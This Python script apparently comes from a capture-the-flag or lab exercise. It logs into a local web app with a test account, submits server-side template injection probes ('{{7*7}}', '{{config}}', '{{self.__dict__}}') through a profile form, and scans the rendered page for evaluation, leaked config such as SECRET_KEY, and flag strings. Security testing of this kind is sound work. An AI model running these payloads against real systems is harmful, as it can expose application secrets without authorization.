import requests
import re

base_url = "http://127.0.0.1:33206"

# Step 1: Login to get session cookie
print("=" * 80)
print("AUTHENTICATION - Login with test account")
print("=" * 80)

login_data = {
    "username": "test",
    "password": "test"
}

login_url = f"{base_url}/login"
print(f"\n[POST] {login_url}")
print(f"[Credentials] test:test")

try:
    login_response = requests.post(login_url, data=login_data, allow_redirects=False, timeout=10)
    print(f"[Status] {login_response.status_code}")
    print(f"[Headers] {dict(login_response.headers)}")
    
    # Extract session cookie
    session_cookie = None
    if login_response.cookies:
        cookies_dict = dict(login_response.cookies)
        print(f"[Cookies] {cookies_dict}")
        session_cookie = login_response.cookies
    else:
        print("[WARNING] No session cookie received")
        
    # Check redirect location
    if 'Location' in login_response.headers:
        redirect_location = login_response.headers['Location']
        print(f"[Redirect] To: {redirect_location}")
        
except Exception as e:
    print(f"[ERROR] Login failed: {e}")
    exit(1)

if not session_cookie:
    print("\n[ERROR] No session cookie obtained. Cannot proceed with authenticated tests.")
    exit(1)

print("\n" + "=" * 80)
print("TEMPLATE INJECTION TESTING - /update_profile (Authenticated)")
print("=" * 80)

# Verify we can access profile page with session
profile_url = f"{base_url}/profile"
print(f"\n[VERIFY ACCESS] GET {profile_url}")

try:
    profile_check = requests.get(profile_url, cookies=session_cookie, timeout=10)
    print(f"[Status] {profile_check.status_code}")
    print(f"[Content Length] {len(profile_check.content)} bytes")
    
    if profile_check.status_code == 200:
        # Check if it shows profile data (not login page)
        if "login" in profile_check.text.lower() and "password" in profile_check.text.lower():
            print("[WARNING] Still showing login page - authentication may have failed")
        else:
            print("[SUCCESS] Authenticated - accessing profile data")
            # Show a snippet
            snippet_start = profile_check.text[:500]
            print(f"[Profile Snippet] {snippet_start}")
    else:
        print(f"[ERROR] Unexpected status code: {profile_check.status_code}")
        
except Exception as e:
    print(f"[ERROR] Profile access failed: {e}")

# Payloads to test for SSTI
payloads = [
    "{{7*7}}",
    "{{config}}",
    "{{self.__dict__}}"
]

# Form data structure - using dummy values for required fields
form_data = {
    "lastname": "User",
    "email": "test@example.com",
    "loan_amount": "10000",
    "loan_term_months": "12",
    "monthly_payment": "833"
}

for i, payload in enumerate(payloads, 1):
    print(f"\n\n[TEST {i}] Testing payload: {payload}")
    print("-" * 80)
    
    # Prepare form data with current payload in 'name' field
    current_form_data = form_data.copy()
    current_form_data["name"] = payload
    
    # POST to /update_profile
    post_url = f"{base_url}/update_profile"
    print(f"\n[POST] {post_url}")
    print(f"[Payload] name={payload}")
    
    try:
        post_response = requests.post(post_url, data=current_form_data, cookies=session_cookie, timeout=10)
        print(f"[Status] {post_response.status_code}")
        print(f"[Headers] {dict(post_response.headers)}")
        
        # Check response body
        if post_response.text:
            post_snippet = post_response.text[:500]
            print(f"[POST Response Body Snippet]\n{post_snippet}")
        
    except Exception as e:
        print(f"[ERROR] POST request failed: {e}")
        continue
    
    # Immediately GET /profile to check if payload rendered
    get_url = f"{base_url}/profile"
    print(f"\n[GET] {get_url}")
    
    try:
        get_response = requests.get(get_url, cookies=session_cookie, timeout=10)
        
        print(f"[Status] {get_response.status_code}")
        print(f"[Content Length] {len(get_response.content)} bytes")
        
        # Check if payload executed by looking for expected results
        response_text = get_response.text
        
        print(f"\n[ANALYSIS] Looking for payload execution:")
        
        execution_results = []
        
        # Test 1: Check for basic math execution (7*7=49)
        if "49" in response_text:
            # Make sure it's not part of the payload itself
            if "{{7*7}}" not in response_text:
                print(f"  [✓] MATH EXECUTED! Found '49' (7*7 result)")
                execution_results.append("MATH_EXECUTED")
            else:
                print(f"  [?] Found '49' but payload also present - ambiguous")
        elif "{{7*7}}" in response_text:
            print(f"  [✗] Payload {{7*7}} appears literally - NOT executed")
            execution_results.append("PAYLOAD_LITERAL")
        else:
            print(f"  [?] No clear indicator for this payload")
            
        # Test 2: Check for config object
        if "config" in response_text.lower():
            # Look for config object indicators
            config_indicators = ["'DEBUG'", '"DEBUG"', "secret_key", "SECRET_KEY", "config_class"]
            if any(indicator.lower() in response_text.lower() for indicator in config_indicators):
                print(f"  [✓] CONFIG OBJECT EXPOSED! Found config data")
                execution_results.append("CONFIG_EXPOSED")
            else:
                print(f"  [?] 'config' found but no clear config data")
        elif "{{config}}" in response_text:
            print(f"  [✗] Payload {{config}} appears literally - NOT executed")
        else:
            print(f"  [?] Config test inconclusive")
            
        # Test 3: Check for __dict__
        if "__dict__" in response_text and "{{self.__dict__}}" not in response_text:
            print(f"  [✓] OBJECT STRUCTURE EXPOSED! Found __dict__")
            execution_results.append("OBJECT_EXPOSED")
        elif "{{self.__dict__}}" in response_text:
            print(f"  [✗] Payload {{self.__dict__}} appears literally - NOT executed")
        
        # Print full profile response for manual inspection
        print(f"\n{'=' * 80}")
        print(f"[FULL PROFILE RESPONSE - Test {i}]")
        print(f"{'=' * 80}")
        print(response_text)
        
        # Extract and highlight the name field
        name_matches = re.findall(r'name\s*[=:]\s*["\']?([^"\'\s]+)["\']?', response_text, re.I)
        if name_matches:
            print(f"\n[EXTRACTED NAME FIELDS] {name_matches}")
        
        # Search for any flag patterns
        flag_pattern = r'FLAG\{[^}]+\}'
        flags = re.findall(flag_pattern, response_text)
        if flags:
            print(f"\n[!] FLAGS FOUND: {flags}")
        
    except Exception as e:
        print(f"[ERROR] GET request failed: {e}")

print("\n" + "=" * 80)
print("TESTING COMPLETE")
print("=" * 80)

# Final summary
print("\n[SUMMARY] Test Results:")
print("  - Authentication: SUCCESS (test:test account)")
print("  - Payloads tested: 3 ({{7*7}}, {{config}}, {{self.__dict__}})")
print("  - Check full output above for execution indicators")

